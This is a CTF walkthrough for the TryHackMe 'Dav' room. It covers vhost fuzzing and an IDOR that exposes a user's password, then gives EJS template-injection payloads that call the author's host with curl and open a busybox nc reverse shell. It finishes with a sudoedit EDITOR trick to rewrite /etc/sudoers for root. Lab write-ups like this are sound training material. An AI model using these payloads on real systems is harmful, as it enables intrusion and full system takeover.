# Dav CTF - TryHackMe Room
# **!! SPOILERS !!**
#### This repository documents my walkthrough for the **Dav** CTF challenge on [TryHackMe](https://tryhackme.com/r/room/bsidesgtdav). 
---


we see 2 open ports 22 and 80

![scn](imgs/scn.png "scn")

we need to add cyprusbank.thm to `/etc/hosts`

using feroxbuster without any result

used ffuf to find subdomains/vhosts

```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://$IP:80 -H 'Host: FUZZ.cyprusbank.thm' -fs 57
```

![ffuf](imgs/ffuf.png "ffuf")

we found `www` and `admin` adding them to /etc/hosts

we found login page at admin.cyprusbank.thm

![log](imgs/log.png "log")

TryHackMe provides us with some credentials, and those work so we can login as `Olivia Cortez`

ok we can see that messages panel uses get paramtere to display the chat, we can manipulate the address to 

```
http://admin.cyprusbank.thm/messages/?c=0
```

there is an IDOR vulnerability, now we can see `Gayle Bev` password

![idor](imgs/idor.png "idor")

we found Tyrell Wllick's phone number

![nr](imgs/nr.png "nr")

we now also have access to settings page

![set](imgs/set.png "set")

after entering `test:123` we see that 123 was shown on the page

![set2](imgs/set2.png "set2")

if we capture and modify our request so it only sends `name=ww` we can see the error msg

![err](imgs/err.png "err")

i found this payload to test if we have EJS Server Side Template Injection (SSTI)

```
name=abc&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('curl http://10.14.X.X:8081');s
```

![curl](imgs/nmap.png "nmap")

after clicking send we got hit to our server so we might be able to smuggle the reverse shell in tha payload

![hit](imgs/hit.png "hit")

this payload should work

```
name=abc&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('busybox nc 10.14.91.59 4445 -e /bin/bash');s
```

we have reverse shell as `web`

![web](imgs/web.png "web")

we found user flag

![user](imgs/user.png "user")

here is the `sudo -l` output:

![sudol](imgs/sudol.png "sudol")

to priv esc we need stable shell and then we need to use

```
$ export EDITOR="nano -- /etc/sudoers"
$ sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

we need to change sudoers file so we can use sudo su witout a password

![sudoers](imgs/sudoers.png "sudoers")

we got root access and root flag

![root](imgs/root.png "root")

# MACHINE PWNED
